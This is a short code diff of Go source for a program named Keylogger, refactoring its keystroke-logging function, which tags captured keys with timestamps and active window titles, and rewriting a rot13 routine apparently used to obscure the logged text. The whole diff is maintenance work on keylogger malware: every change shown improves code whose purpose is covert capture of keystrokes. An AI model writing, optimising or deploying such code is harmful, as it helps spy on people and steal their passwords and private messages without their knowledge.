@@ -369,9 +369,9 @@ func (k *Keylogger) logKey(key string) {
 			k.currentWindowTitle = windowTitle
 		}
 		if k.currentWindowTitle != "" {
-			k.buffer.WriteString(fmt.Sprintf("[%s] [%s] ", timestamp, k.currentWindowTitle))
+			fmt.Fprintf(&k.buffer, "[%s] [%s] ", timestamp, k.currentWindowTitle)
 		} else {
-			k.buffer.WriteString(fmt.Sprintf("[%s] ", timestamp))
+			fmt.Fprintf(&k.buffer, "[%s] ", timestamp)
 		}
 		k.lineStarted = true
 	}
@@ -384,19 +384,24 @@ func (k *Keylogger) logKey(key string) {
 	}
 }
 
-func rot13(s string) string {
-	var result strings.Builder
-	for _, r := range s {
-		switch {
-		case r >= 'a' && r <= 'z':
-			result.WriteRune('a' + (r-'a'+13)%26)
-		case r >= 'A' && r <= 'Z':
-			result.WriteRune('A' + (r-'A'+13)%26)
-		default:
-			result.WriteRune(r)
-		}
+var rot13Table = func() [256]byte {
+	var t [256]byte
+	for i := range t {
+		t[i] = byte(i)
 	}
-	return result.String()
+	for i := 0; i < 26; i++ {
+		t['a'+i] = byte('a' + (i+13)%26)
+		t['A'+i] = byte('A' + (i+13)%26)
+	}
+	return t
+}()
+
+func rot13(s string) string {
+	b := []byte(s)
+	for i, c := range b {
+		b[i] = rot13Table[c]
+	}
+	return string(b)
 }
 
 func getTempDir() string {
